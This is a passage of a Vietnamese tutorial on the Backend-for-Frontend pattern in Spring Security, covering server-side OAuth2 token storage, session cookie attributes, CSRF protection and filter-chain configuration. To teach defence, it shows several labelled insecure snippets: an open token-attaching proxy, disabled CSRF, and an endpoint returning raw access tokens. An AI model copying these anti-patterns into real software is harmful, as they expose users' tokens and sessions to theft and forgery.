# 23.11. Mô hình BFF và ranh giới lưu token giữa backend với trình duyệt

## 1. Vì sao cần một ranh giới rõ ràng giữa browser và OAuth2 token?

Trong một ứng dụng web hiện đại, frontend thường viết bằng React, Vue hoặc Angular, còn backend sử dụng Spring Boot. Người dùng đăng nhập qua một OpenID Provider (OP), rồi giao diện gọi các API để đọc hồ sơ, đơn hàng hoặc dữ liệu nghiệp vụ.

Câu hỏi kiến trúc không chỉ là **“đăng nhập bằng OAuth2 như thế nào?”** mà còn là:

- **Ai là OAuth2 client?** JavaScript chạy trong browser hay backend Spring Boot?
- **Access token được lưu ở đâu?** Trong browser memory, Local Storage, session storage, cookie hay backend?
- **Refresh token có bao giờ đi qua browser không?**
- **Browser chứng minh phiên đăng nhập với backend bằng gì?**
- **Backend gọi Resource Server thay mặt người dùng bằng token nào?**
- **Cookie giúp tránh JavaScript đọc token, nhưng bảo vệ CSRF ra sao?**
- **Nếu triển khai nhiều Spring Boot instances, phiên và token được tìm lại như thế nào?**
- **Khi logout, refresh token, session và OIDC session được thu hồi như thế nào?**

**Backend for Frontend (BFF)** là một cách tổ chức trong đó **backend giữ vai trò OAuth2 confidential client**, xử lý Authorization Code Flow, giữ OAuth2 tokens ở phía server và cung cấp một **phiên dựa trên cookie** cho trình duyệt. Browser gọi các API **của BFF**, thay vì nhận OAuth2 access token rồi tự gửi trực tiếp tới mọi downstream API.

Ví dụ:

```text
Browser JavaScript
    |
    | Cookie: SESSION=opaque-session-id
    | GET /api/orders
    v
BFF - Spring Boot / Spring Security
    |
    | Tìm session + Authentication
    | Tìm OAuth2AuthorizedClient của user
    | Refresh token nếu cần và được phép
    |
    | Authorization: Bearer DOWNSTREAM_ACCESS_TOKEN
    v
Orders Resource Server
```

**Nguyên tắc cốt lõi:**

> Trình duyệt giữ **cookie định danh phiên BFF**; backend giữ **access token và refresh token**. Cookie phiên không được biến thành access token, và OAuth2 token không được đưa vào JavaScript, HTML hoặc browser storage.

BFF không thể ngăn mọi loại tấn công. JavaScript độc hại chạy trong origin được người dùng tin cậy vẫn có thể gửi các yêu cầu bằng phiên của họ. BFF **giảm khả năng chiếm đoạt OAuth2 tokens trực tiếp từ JavaScript**, nhưng không loại bỏ nhu cầu bảo vệ XSS, CSRF, session hijacking và kiểm tra quyền.

### Mục tiêu bài học

Sau bài này, bạn sẽ:

1. Vẽ được luồng BFF cho OAuth2/OIDC Login và API calls.
2. Phân biệt session ID cookie, Authentication, ID Token, access token và refresh token.
3. Hiểu `OAuth2AuthorizedClientRepository`, `OAuth2AuthorizedClientService`, `HttpSession` và Spring Session.
4. Cấu hình Spring Security Servlet OAuth2 Login với server-side session.
5. Thiết lập thuộc tính cookie `HttpOnly`, `Secure`, `SameSite`, `Path` và phạm vi host.
6. Bảo vệ các yêu cầu thay đổi trạng thái bằng CSRF token.
7. Hiểu `state`, PKCE và OIDC `nonce` khác CSRF token của API ra sao.
8. Viết frontend `fetch()` gọi BFF mà không biết OAuth2 token.
9. Dùng backend lấy authorized client và gọi downstream Resource Server.
10. Phân tích XSS, CORS, CSRF, token leakage, SSRF và confused deputy.
11. Thiết kế BFF nhiều instances, session persistence và refresh-token rotation.
12. Thực hiện logout/revocation và xử lý lỗi đúng các lớp.
13. Kiểm thử ranh giới bảo mật browser–BFF–API.

Các domain, registration IDs, tokens và phiên trong bài đều là **ví dụ giả lập**. Ví dụ tập trung vào **Spring Security OAuth 2.0/OIDC Client trên Servlet/Spring MVC**; WebFlux được so sánh ở phần riêng.

---

## 2. BFF là gì và không phải là gì?

**Backend for Frontend** là một backend phục vụ nhu cầu riêng của một hoặc một nhóm frontend. Trong ngữ cảnh OAuth2 của ứng dụng browser, BFF đảm nhận:

- Khởi tạo Authorization Code Flow và kiểm tra callback.
- Xác thực OAuth2 client với Authorization Server khi cần.
- Duy trì server-side login/session.
- Lưu OAuth2 tokens ở backend, không trao token raw cho browser.
- Gọi Resource Server thay browser.
- Áp dụng authorization và giới hạn API mà frontend có thể gọi.
- Quản lý refresh token, logout, session expiry và token revocation theo chính sách.

BFF có thể đồng thời thực hiện aggregation dữ liệu, mapping DTO và validation requests.

### 2.1. BFF không có nghĩa chỉ viết một reverse proxy

Một proxy nguy hiểm:

```text
GET /proxy?url=https://any-host.example
Authorization: session cookie

BFF:
    Lấy token của user
    Gắn Bearer token vào bất kỳ URL nào browser yêu cầu
```

Đây không phải một BFF có ranh giới an toàn. Nó mở đường cho **SSRF**, token exfiltration và sử dụng token sai audience.

BFF đúng nghĩa cần những API endpoints được kiểm soát:

```text
GET /api/orders
POST /api/orders/{id}/cancel
GET /api/profile
```

Mỗi endpoint chọn upstream cố định, kiểm tra quyền và chỉ gửi access token tới Resource Server được phép.

### 2.2. BFF không có nghĩa backend có quyền làm mọi thứ thay user

Backend có thể dùng một access token được cấp cho user, nhưng:

- Token vẫn bị ràng buộc bởi scopes, audience và thời hạn.
- Resource Server vẫn phải kiểm tra business authorization.
- BFF không được dùng client credentials mạnh hơn để âm thầm vượt quyền user.
- Nếu có nhiều tenants, backend phải chọn đúng token/tenant của request hiện tại.
- Không cho caller chỉ định một `principalName` tùy ý rồi truy xuất token của người khác.

---

## 3. So sánh SPA trực tiếp và BFF

### 3.1. Mô hình browser là OAuth2 public client

```mermaid
flowchart TD
    A["Browser / SPA"] -->|Authorization Code + PKCE| AS["Authorization Server"]
    AS -->|Access Token, có thể Refresh Token| A
    A -->|Bearer Access Token| API["Resource Server"]
```

Trong mô hình này, SPA thực hiện OAuth2 Authorization Code with PKCE như một **public client**. SPA không giữ được `client_secret` an toàn, vì bất kỳ JavaScript nào gửi tới browser cũng có thể bị người dùng hoặc mã độc trong origin quan sát.

Access token có thể nằm trong memory; một số ứng dụng chọn browser storage khác. Mỗi lựa chọn có trade-off riêng về XSS, page reload, expiration, session management và refresh token rotation.

**Không thể coi `localStorage` hay `sessionStorage` là nơi giữ OAuth2 tokens chống XSS.** JavaScript chạy cùng origin thường có thể truy cập dữ liệu đó.

### 3.2. Mô hình backend là OAuth2 confidential client

```mermaid
flowchart TD
    Browser["Browser / Frontend"] -->|"Cookie phiên; không có OAuth2 token"| BFF["BFF - OAuth2 Confidential Client"]
    BFF -->|"Authorization Code + PKCE, client authentication"| AS["Authorization Server"]
    AS -->|"Tokens qua back channel"| BFF
    BFF -->|"Bearer access token"| API["Resource Server"]
```

Với BFF:

- Browser vẫn tham gia **front-channel redirect**, nhưng **token exchange** diễn ra qua back channel giữa BFF và AS.
- Client secret hoặc private key nằm ở backend.
- Tokens được lưu ở nơi backend kiểm soát.
- Browser chỉ cần cookie phiên (thường là opaque identifier).
- BFF thực hiện API calls và trả về dữ liệu nghiệp vụ đã lọc.

### 3.3. Bảng so sánh

| Đặc điểm | SPA là OAuth2 client | BFF là OAuth2 client |
|---|---|---|
| Loại client thường gặp | Public | Confidential |
| Ai gọi Token Endpoint? | Browser/client runtime, theo flow | Backend |
| Client secret có giữ an toàn không? | Không | Có thể giữ tại backend với secret management |
| Access token có đến JavaScript? | Thường có | **Không** theo nguyên tắc BFF |
| Refresh token có đến JavaScript? | Có thể, nếu AS/policy cho phép | **Không** theo nguyên tắc BFF |
| Browser gọi API như thế nào? | Bearer token trực tiếp | Cookie đến BFF; BFF gắn Bearer tới API |
| Nguy cơ XSS đánh cắp raw token | Cao hơn nếu token JS-accessible | Giảm đáng kể |
| Nguy cơ XSS gọi API bằng phiên hiện tại | Có | **Vẫn có** |
| Nguy cơ CSRF do credential tự gửi | Tùy kiểu token transport | Cần xử lý vì browser tự gửi cookie |
| Phụ thuộc session store backend | Không nhất thiết | Thường có |
| Backend scaling | Ít proxy traffic hơn | Phải xử lý user-session/API gateway traffic |
| API có thể chặn browser trực tiếp | Có thể cần CORS | Có thể chỉ cho BFF gọi API |
| Logout/refresh | Frontend cần phối hợp | Backend quản lý token lifecycle |

Một lựa chọn không tự tốt hơn mọi trường hợp. Với ứng dụng browser cần truy cập OAuth2 tokens nhưng muốn giảm rủi ro token bị JavaScript đọc, **BFF thường là một lựa chọn bảo mật hợp lý**.

---

## 4. Phân biệt năm đối tượng dễ bị nhầm

| Đối tượng | Bên thường giữ trong BFF | Mục đích |
|---|---|---|
| **Session cookie** | Browser | Gửi một opaque session identifier cho BFF |
| **Server-side session** | Backend/session store | Dữ liệu phiên và SecurityContext theo cấu hình |
| **Authentication / SecurityContext** | Spring Security backend | Xác định principal đã đăng nhập và authorities |
| **OIDC ID Token** | Backend | Xác minh sự kiện OIDC Authentication; không phải API access token |
| **OAuth2 access token** | Backend authorized client store | Gọi Resource Server phù hợp audience/scope |
| **OAuth2 refresh token** | Backend authorized client store, nếu AS cấp | Xin access token mới theo chính sách |

Bảng liệt kê sáu đối tượng vì **session cookie và session record** cũng là hai thứ khác nhau. Một cookie như:

```http
Cookie: JSESSIONID=7C8A9F...
```

thường chỉ là **khóa tham chiếu** tới session trên server, không phải raw access token.

Với Spring Session, cookie có thể tên `SESSION` thay vì `JSESSIONID` tùy cấu hình. Tên cookie không quyết định mô hình bảo mật; **nội dung cookie và cách backend quản lý session** mới quan trọng.

### 4.1. Cookie phiên cũng là credential

Dù cookie không chứa OAuth2 token, **session ID vẫn là bearer credential đối với BFF**: ai chiếm được cookie còn hợp lệ có thể thử sử dụng phiên.

Do đó phải bảo vệ cookie bằng TLS, `HttpOnly`, `Secure`, `SameSite`, TTL, session fixation protection, logout invalidation và các biện pháp vận hành khác.

**Không nói “browser không có token nên browser không giữ credential”.** Browser vẫn giữ session credential.

### 4.2. ID Token không thay access token

OIDC ID Token thường chứa claims như `iss`, `sub`, `aud`, `exp` để client biết End-User đã được xác thực. Resource Server API nên nhận **OAuth2 access token** được cấp dành cho chính nó.

Không tự gửi:

```http
Authorization: Bearer <ID_TOKEN>
```

tới downstream API chỉ vì ID Token là JWT.

---

## 5. Luồng đăng nhập BFF với OIDC Authorization Code Flow

Giả sử ứng dụng:

```text
Frontend + BFF origin: https://portal.example.com
Authorization Server: https://login.example-idp.com
Orders API: https://orders.internal.example
```

### 5.1. Luồng chi tiết

```mermaid
sequenceDiagram
    autonumber
    actor U as Browser
    participant B as Spring Boot BFF
    participant S as Server Session / Authorized Client Store
    participant AS as OpenID Provider

    U->>B: GET /app hoặc GET /api/me
    B-->>U: Redirect đến login hoặc hiển thị login
    U->>B: GET /oauth2/authorization/corporate
    B->>S: Lưu authorization request, state và PKCE verifier
    B-->>U: 302 tới AS /authorize
    U->>AS: GET /authorize với state, code_challenge, nonce nếu OIDC
    AS->>U: User authentication và consent/policy
    AS-->>U: Redirect về BFF với code và state
    U->>B: GET /login/oauth2/code/corporate?code=...&state=...
    B->>S: Load authorization request và kiểm tra state
    B->>AS: POST /token, authorization_code + PKCE + client authentication
    AS-->>B: Access Token + ID Token; Refresh Token nếu được cấp
    B->>B: Xác minh OIDC ID Token và tạo Authentication
    B->>S: Lưu SecurityContext/authorized client phía backend
    B-->>U: Set-Cookie phiên HttpOnly; redirect về /app
    U->>B: GET /api/me, Cookie phiên
    B->>S: Khôi phục SecurityContext của user
    B-->>U: JSON thông tin user cho phép hiển thị, không token
```

### 5.2. Front channel và back channel

**Front channel qua browser:**

- Điều hướng tới `/authorize`.
- Authorization Code và `state` được chuyển về redirect URI của BFF.
- Cookie phiên BFF được gửi giữa browser và BFF.

**Back channel giữa backend và AS:**

- Gửi authorization code tới Token Endpoint.
- Client authentication/PKCE verification.
- Nhận access token, ID Token, refresh token nếu có.
- Lưu token ở backend.

Sự xuất hiện của **authorization code** trong redirect không có nghĩa OAuth2 access token đã được trả cho JavaScript. Code ngắn hạn, dùng một lần và được bảo vệ bởi `state`/PKCE, nhưng vẫn cần bảo vệ log, referrer và redirect URI.

### 5.3. BFF confidential client vẫn nên dùng PKCE

PKCE đặc biệt bắt buộc/quan trọng với public clients, nhưng cũng hữu ích cho confidential clients như một biện pháp defense in depth trước authorization code interception/injection.

Trong Spring Security, PKCE cho một authorization request có thể được bổ sung thông qua:

```java
OAuth2AuthorizationRequestCustomizers.withPkce()
```

khi cấu hình `DefaultOAuth2AuthorizationRequestResolver`, nếu cần bật cho confidential client trong phiên bản/setting đang dùng.

**PKCE không thay client authentication** và không thay `state`. OIDC `nonce` lại phục vụ việc liên kết ID Token với authentication request. Ba cơ chế giải quyết các nhóm rủi ro khác nhau.

---

## 6. Luồng gọi API sau đăng nhập

```mermaid
sequenceDiagram
    autonumber
    actor Browser
    participant BFF as Spring Boot BFF
    participant Sess as Session Store
    participant AC as Authorized Client Store
    participant AS as Authorization Server
    participant API as Orders Resource Server

    Browser->>BFF: GET /api/orders + Cookie SESSION
    BFF->>Sess: Load SecurityContext bằng session ID
    Sess-->>BFF: Authentication(Alice)
    BFF->>BFF: Kiểm tra endpoint authorization
    BFF->>AC: Load authorized client của Alice
    AC-->>BFF: Access Token AT1 + expiry
    opt Token cần cấp lại
        BFF->>AS: POST /token bằng refresh token RT1 nếu có
        AS-->>BFF: AT2 + RT2 nếu AS rotate
        BFF->>AC: Save authorized client mới
    end
    BFF->>API: GET /orders, Authorization Bearer access token
    API->>API: Kiểm tra issuer/audience/scope/ownership
    API-->>BFF: Orders JSON
    BFF-->>Browser: JSON nghiệp vụ, không access/refresh token
```

Điều quan trọng:

- Browser **không gửi Authorization Bearer access token đến BFF** trong mô hình BFF dựa trên session cookie.
- Backend **không gửi BFF session cookie đến Resource Server**.
- BFF **không trả access token hay refresh token trong JSON**.
- Resource Server vẫn tự kiểm tra access token; BFF login không thay quyền truy cập của API.
- Refresh token được quản lý phía backend, và có thể không được AS cấp.

### 6.1. “Mỗi request gọi API đều phải xin token mới” là sai

`OAuth2AuthorizedClientManager` và authorized client store giúp **tái sử dụng access token còn hạn** rồi cấp lại khi cần, theo provider configuration. Không gọi Token Endpoint trước mọi outgoing API call nếu access token vẫn còn đủ hạn.

---

## 7. Các thành phần Spring Security lưu phiên và token

Trong Servlet stack có nhiều abstraction, cần phân biệt rõ.

### 7.1. `SecurityContextRepository`

Ví dụ:

```java
org.springframework.security.web.context.SecurityContextRepository
```

Lưu/khôi phục `SecurityContext` cho inbound request, thường liên quan tới `HttpSession` theo cấu hình security chain.

`SecurityContext` chứa Authentication, không phải toàn bộ OAuth2 token cache một cách mặc định.

### 7.2. `HttpSession`

`HttpSession` là cơ chế phiên server-side trong Servlet. Browser giữ cookie session ID; server giữ dữ liệu phiên.

Spring Security có thể dùng session để lưu SecurityContext và authorization request state. Nếu ứng dụng khởi động nhiều instances, cần chiến lược duy trì session giữa các nodes.

### 7.3. `OAuth2AuthorizedClientRepository`

Interface:

```java
org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository
```

Nó load/save/remove authorized clients trong ngữ cảnh Servlet request và Authentication, với:

```java
HttpServletRequest
HttpServletResponse
```

### 7.4. `OAuth2AuthorizedClientService`

Interface:

```java
org.springframework.security.oauth2.client.OAuth2AuthorizedClientService
```

Nó lưu/truy xuất authorized client theo:

```text
(clientRegistrationId, principalName)
```

Một BFF nhiều users có thể có:

```text
("corporate", "alice-uid") -> AT_ALICE, RT_ALICE
("corporate", "bob-uid")   -> AT_BOB, RT_BOB
```

Không dùng một biến singleton `lastAccessToken` cho mọi users.

### 7.5. Các implementations cần biết

| Implementation | Thường dùng để làm gì? |
|---|---|
| `HttpSessionOAuth2AuthorizedClientRepository` | Authorized client theo Servlet HTTP session |
| `AuthenticatedPrincipalOAuth2AuthorizedClientRepository` | Delegate tới service cho authenticated principal, thường dùng session repo cho anonymous |
| `InMemoryOAuth2AuthorizedClientService` | Lưu trong RAM của một process |
| `JdbcOAuth2AuthorizedClientService` | Lưu trong relational database |
| `Spring Session` | Lưu/khôi phục HTTP sessions qua Redis/JDBC hoặc repository phù hợp |

**Spring Session và OAuth2AuthorizedClientService không phải cùng một abstraction.**

Nếu SecurityContext được chia sẻ qua Spring Session Redis nhưng authorized clients dùng **InMemoryOAuth2AuthorizedClientService ở từng pod**, một request có thể có phiên đăng nhập hợp lệ trên pod B nhưng không tìm thấy authorized client vốn chỉ được lưu tại pod A.

Ngược lại, có shared authorized client DB nhưng session chỉ nằm trên một pod thì phiên vẫn có thể mất sau khi chuyển node.

---

## 8. Ranh giới lưu trữ: dữ liệu nào nằm ở đâu?

| Dữ liệu | Browser | BFF memory/session/store | Authorization Server | Resource Server |
|---|---|---|---|---|
| BFF session ID | **Có, trong cookie** | Session record tham chiếu ID | Không | Không |
| `SecurityContext`/Authentication | Không gửi nguyên object | **Có** | Có identity source riêng | Có authentication từ API token |
| Authorization Code | Có thể xuất hiện ở redirect URL ngắn hạn | Nhận và đổi thành token | Phát code | Không |
| `state`/PKCE verifier | Browser thấy `state` trên URL | **Giữ verifier và expected state** | Nhận challenge/compare | Không |
| OAuth access token | **Không trong BFF pattern** | **Có** | Phát hành | Nhận để xác minh |
| OAuth refresh token | **Không** | **Có, nếu được cấp** | Phát hành/validate | Không |
| OIDC ID Token | **Không cần trả browser** | **Có khi dùng OIDC Login** | Phát hành | Không dùng làm API token |
| CSRF token cho BFF API | Có thể được JS đọc/gửi header | Có state/validation policy | Không liên quan | Không liên quan |
| Business API response | **Có** | Có thể xử lý/cache | Không | **Phát dữ liệu** |

Chữ “không” là **nguyên tắc thiết kế cần thực thi**. Nếu backend vô tình serialize `OAuth2AuthorizedClient` thành JSON, đưa token vào `<script>`, `Set-Cookie`, fragment URL hoặc header, ranh giới BFF đã bị phá vỡ.

### 8.1. Không để browser giữ refresh token

Refresh token thường có khả năng cấp access token mới trong thời gian dài; một khi bị lộ cho JavaScript, nó có thể bị đánh cắp bởi XSS hoặc third-party script compromise.

BFF không đưa refresh token vào:

```text
localStorage
sessionStorage
IndexedDB
window.__INITIAL_STATE__
HTML meta tag
JavaScript variable
URL query/fragment
Readable cookie
JSON response
```

Ngay cả việc đưa refresh token vào một cookie HttpOnly phía browser cũng **không phải server-side token storage**. Cookie vẫn di chuyển qua HTTP requests, có thể bị lộ qua hệ thống logging/proxy, ràng buộc kích thước và replay. **BFF nên dùng cookie chứa opaque session identifier** và lưu refresh token tại backend.

### 8.2. Vì sao không encrypt access token rồi trả cho browser?

Mã hóa token trước khi đưa vào browser không tự biến nó thành server-side storage. Nếu browser chỉ làm nơi giữ ciphertext, đó là kiến trúc khác với BFF session truyền thống và cần đánh giá thiết kế cookie size, replay, rotation, encryption key và CSRF.

Không nhầm “token browser không giải mã được” với “token không tồn tại trong browser”. Tài liệu này dùng ranh giới **browser chỉ có session cookie**, không lưu OAuth2 tokens dù dưới dạng encrypted blob.

---

## 9. Cookie phiên: `HttpOnly`, `Secure`, `SameSite`, `Path` và `Domain`

Ví dụ một session cookie:

```http
Set-Cookie: __Host-SESSION=RANDOM_OPAQUE_ID; Path=/; Secure; HttpOnly; SameSite=Lax
```

Đây là ví dụ mô hình. Để dùng prefix `__Host-`, cookie phải có `Secure`, `Path=/` và **không có `Domain`**; backend phải thực sự cấu hình cookie name và session repository phù hợp.

### 9.1. `HttpOnly`

```http
HttpOnly
```

Ngăn JavaScript thông thường đọc cookie qua `document.cookie`. Nó giảm khả năng XSS **đánh cắp cookie value trực tiếp**.

Nhưng XSS trên cùng origin vẫn có thể gửi:

```js
fetch("/api/orders", { credentials: "same-origin" });
```

Browser tự gắn cookie. Do đó HttpOnly **không ngăn XSS thực hiện thao tác bằng phiên đang hoạt động**.

### 9.2. `Secure`

```http
Secure
```

Giới hạn việc browser gửi cookie qua HTTPS (với một số ngoại lệ môi trường phát triển đặc biệt theo browser).

Production BFF phải dùng HTTPS end-to-end hoặc reverse proxy termination được cấu hình tin cậy. Nếu BFF public URL là HTTPS nhưng Spring chạy HTTP sau proxy, phải cấu hình forwarded headers đúng trust boundary để các URL/cookies được phát hành chính xác.

### 9.3. `SameSite`

Các giá trị thường gặp:

| Giá trị | Hành vi khái quát | Rủi ro/lưu ý |
|---|---|---|
| `Strict` | Hạn chế cookie khi request đến từ site khác | Có thể làm hỏng luồng điều hướng quay lại từ IdP |
| `Lax` | Cho phép một số top-level cross-site navigations, thường là GET | Không thay CSRF token; thường phù hợp với redirect callback GET |
| `None` | Cho phép cross-site gửi cookie theo chính sách browser | **Phải kèm Secure**; rủi ro CSRF tăng và có thể bị browser chặn third-party cookies |

`SameSite` là khái niệm **site**, không hoàn toàn đồng nhất với **origin**. Hai subdomains có thể là same-site nhưng cross-origin.

Đối với OIDC Authorization Code redirect callback dạng **top-level GET**, `SameSite=Lax` thường phù hợp. Nếu IdP dùng `response_mode=form_post`, callback là cross-site POST nên Lax có thể không gửi cookie lưu authorization request/session. Khi đó phải thiết kế cookie/callback tương thích chứ không tắt kiểm tra `state`.

### 9.4. `Path` và host-only cookie

Nên hạn chế cookie đến ứng dụng BFF cần nó:

- `Path=/` khi toàn portal dùng cùng phiên.
- Không đặt `Domain=.example.com` nếu không có yêu cầu; host-only cookie giảm phạm vi chia sẻ với subdomains.
- Prefix `__Host-` giúp ràng buộc cookie host-only trong browsers hỗ trợ.
- Không lưu session ID trong URL, query parameter, fragment hoặc log.

### 9.5. Session cookie vẫn có thể bị đánh cắp

`HttpOnly` không chống được tất cả các tình huống: malware, browser compromise, misconfigured proxy, HTTP plaintext hoặc server-side logs vẫn có thể làm lộ session IDs.

Hãy bảo vệ session ID như một credential. Logout và session invalidation phải làm ID cũ không còn giá trị.

---

## 10. Vì sao BFF dùng cookie phải chống CSRF?

Browser **tự động gửi session cookie** khi request đáp ứng cookie policy. Trang độc hại có thể cố khiến browser gửi một request tới BFF bằng cookies đang đăng nhập.

Ví dụ:

```text
Alice đang đăng nhập portal.example.com

Alice mở evil.example.org
    |
    +-- Trang độc hại cố gửi POST tới portal.example.com/api/orders/123/cancel
    |
    +-- Browser có thể gửi BFF session cookie tùy SameSite/context
    |
    +-- Nếu BFF không kiểm tra CSRF -> nguy cơ thay đổi dữ liệu
```

BFF không gửi OAuth2 token cho browser, nhưng **cookie authentication** vẫn cần CSRF protection.

### 10.1. CSRF token khác OAuth2 `state`

| Cơ chế | Bảo vệ chính |
|---|---|
| `state` | Liên kết OAuth2 authorization response với request bắt đầu trước đó; giảm login CSRF/mix-up theo thiết kế |
| PKCE | Liên kết authorization code với verifier do client giữ, chống code interception/injection |
| OIDC `nonce` | Liên kết ID Token với OIDC authentication request, chống token replay theo OIDC |
| **CSRF token cho BFF API** | Bảo vệ state-changing HTTP requests dùng cookie authentication |
| `SameSite` cookie | Một lớp giảm cross-site cookie sending trong các bối cảnh được browser áp dụng |

`state` không thay cho CSRF token của `/api/orders`. Và `SameSite=Lax` không phải lý do để tắt CSRF filter.

### 10.2. Spring Security CSRF mặc định

Trong Spring Security Servlet, CSRF protection được bật theo mặc định trong cấu hình web thông thường. Hãy **giữ nguyên** khi sử dụng session cookies.

Các HTTP methods thay đổi trạng thái như `POST`, `PUT`, `PATCH`, `DELETE` cần CSRF validation, trừ những ngoại lệ có lý do kỹ thuật và được thiết kế an toàn.

Không viết:

```java
http.csrf(csrf -> csrf.disable()); // Anti-pattern cho session-cookie BFF
```

chỉ vì frontend là SPA và API trả JSON.

### 10.3. CSRF token có thể được JavaScript đọc không?

Có, đây thường là một phần của **double-submit** hoặc **synchronizer token** pattern. CSRF token **không phải OAuth2 access token** và không phải refresh token.

Ví dụ BFF cung cấp một endpoint trả token cho SPA:

```json
{
  "headerName": "X-CSRF-TOKEN",
  "token": "CSRF_VALUE_FOR_CURRENT_SESSION"
}
```

JavaScript gửi header này trong những requests thay đổi dữ liệu. Vì một trang cross-site thông thường không thể đọc response cùng-origin do Same-Origin Policy, kẻ tấn công không đơn giản lấy được CSRF token.

Tuy nhiên, **XSS cùng origin có thể đọc CSRF token**. Do đó CSRF và XSS phải được phòng vệ riêng.

---

## 11. Cấu hình Spring Boot Servlet BFF

Một Spring Boot 3.x application minh họa sử dụng:

```groovy
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'
}
```

Nếu dùng `RestClient` (Spring Framework 6.1+, tương ứng Boot 3.2+) để gọi downstream API thì starter web đã cung cấp HTTP client API.

Với Boot 4.x, tên starters được tổ chức lại trong một số trường hợp; nên dùng BOM của dòng Boot/Security hiện tại thay vì copy version rời rạc.

### 11.1. `application.yml` cho OIDC Login

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          corporate:
            provider: corporate-idp
            client-id: ${CORPORATE_CLIENT_ID}
            client-secret: ${CORPORATE_CLIENT_SECRET}
            client-authentication-method: client_secret_basic
            authorization-grant-type: authorization_code
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
            scope:
              - openid
              - profile
              - orders.read
        provider:
          corporate-idp:
            issuer-uri: https://login.example-idp.com
```

`orders.read` chỉ là ví dụ; provider có thể yêu cầu Resource Indicator, audience configuration hoặc API permissions riêng. **OIDC Login thành công không đảm bảo access token được cấp phù hợp cho Orders API.**

Trong BFF:

- `client-id`/`client-secret` chỉ nằm ở backend/secret manager.
- Redirect URI trỏ **về BFF**, không phải callback JavaScript tại SPA.
- PKCE nên được dùng theo chính sách/phiên bản cấu hình phù hợp.
- `openid` làm flow trở thành OIDC Login khi IdP hỗ trợ.
- Authorization Server có thể không cấp refresh token; không giả định luôn có.

### 11.2. Session cookie settings

Một ví dụ với container-managed Servlet session:

```yaml
server:
  servlet:
    session:
      timeout: 30m
      cookie:
        http-only: true
        secure: true
        same-site: lax
        path: /
```

`timeout: 30m` là giá trị minh họa. Session TTL cần chọn theo mức rủi ro và UX; có thể yêu cầu thêm **absolute lifetime**, idle timeout, reauthentication và policy riêng.

Nếu sử dụng **Spring Session**, cookie serializer và application properties có thể có cơ chế cấu hình riêng. Đừng khẳng định `server.servlet.session.cookie.*` luôn điều khiển mọi cookie do Spring Session phát hành trong mọi version/deployment.

### 11.3. Không dùng STATELESS cho BFF session login

Anti-pattern:

```java
.sessionManagement(session ->
    session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
)
```

Đây không phải mô hình session-cookie BFF truyền thống. Nó có thể khiến app không giữ authentication/session như mong đợi.

Thường dùng mặc định hoặc:

```java
.sessionManagement(session ->
    session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
)
```

để Spring Security có thể tạo session khi cần trong login flow.

**BFF cũng có thể được thiết kế theo mô hình session khác**, nhưng khi đã chọn server-side cookie session, không nên trộn với một stateless Bearer API configuration rồi kỳ vọng cả hai hoạt động tự động.

---

## 12. SecurityFilterChain của BFF

Ví dụ:

```java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.Customizer;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.SecurityFilterChain;

@Configuration
public class BffSecurityConfiguration {

    @Bean
    SecurityFilterChain bffSecurityFilterChain(HttpSecurity http)
            throws Exception {

        http
            .authorizeHttpRequests(authorize -> authorize
                .requestMatchers(
                    "/",
                    "/index.html",
                    "/assets/**",
                    "/favicon.ico",
                    "/error"
                ).permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(Customizer.withDefaults())
            .oauth2Client(Customizer.withDefaults())
            .logout(logout -> logout
                .logoutUrl("/logout")
                .invalidateHttpSession(true)
                .clearAuthentication(true)
            );

        // Giữ CSRF protection mặc định.
        return http.build();
    }
}
```

Giải thích:

1. Frontend static assets có thể tải khi chưa đăng nhập.
2. Các API endpoints khác yêu cầu Authentication.
3. OAuth2 Login tạo authentication và xử lý callback.
4. OAuth2 Client support giúp quản lý authorized client.
5. Logout vô hiệu hóa session theo cấu hình.
6. Không disable CSRF.
7. Session vẫn được phép sử dụng.

Khi triển khai thật, cần kiểm tra routing của SPA (fallback về `index.html`), endpoint authorization `/oauth2/authorization/{registrationId}`, callback `/login/oauth2/code/{registrationId}` và login entrypoint theo security chain.

### 12.1. Không để `permitAll()` bao phủ `/api/**`

Nếu controller `/api/orders` không tự kiểm tra login mà filter chain cấp permitAll cho mọi API, BFF có thể xử lý request không xác thực hoặc trả lỗi khó hiểu.

Cần xác định rõ endpoints public và authenticated. Trong môi trường nhiều SecurityFilterChains, thứ tự matchers/chain selection phải chính xác.

### 12.2. Session fixation protection

Sau khi đăng nhập thành công, Spring Security có các cơ chế session fixation protection phù hợp mặc định. Mục tiêu là tránh reuse session ID do kẻ tấn công áp đặt trước login.

Không vô hiệu hóa session fixation protection để “giữ nguyên cookie” khi đang debug OAuth2 login nếu không có lý do bảo mật được đánh giá.

### 12.3. Không expose token endpoint cho frontend

Không tạo:

```java
@GetMapping("/api/access-token")
public String token(...) {
    return authorizedClient.getAccessToken().getTokenValue();
}
```

Điều này phá ranh giới BFF. Browser có thể dùng cookie gọi endpoint để lấy raw access token, và XSS cũng có thể làm vậy.

Thay bằng endpoints nghiệp vụ trả data đã được kiểm soát:

```text
GET /api/orders -> OrderDto[]
GET /api/me     -> UserProfileDto
```

---

## 13. Endpoint CSRF cho SPA dùng cookie session

Một cách triển khai dễ kiểm soát là cung cấp token qua JSON cho JavaScript và yêu cầu trình duyệt gửi lại qua header trong các requests thay đổi trạng thái.

Ví dụ controller:

```java
import java.util.Map;

import jakarta.servlet.http.HttpServletRequest;

import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class CsrfController {

    @GetMapping("/api/csrf")
    public Map<String, String> csrf(HttpServletRequest request) {
        CsrfToken token = (CsrfToken)
            request.getAttribute(CsrfToken.class.getName());

        if (token == null) {
            throw new IllegalStateException(
                "CSRF protection is not configured"
            );
        }

        return Map.of(
            "headerName", token.getHeaderName(),
            "token", token.getToken()
        );
    }
}
```

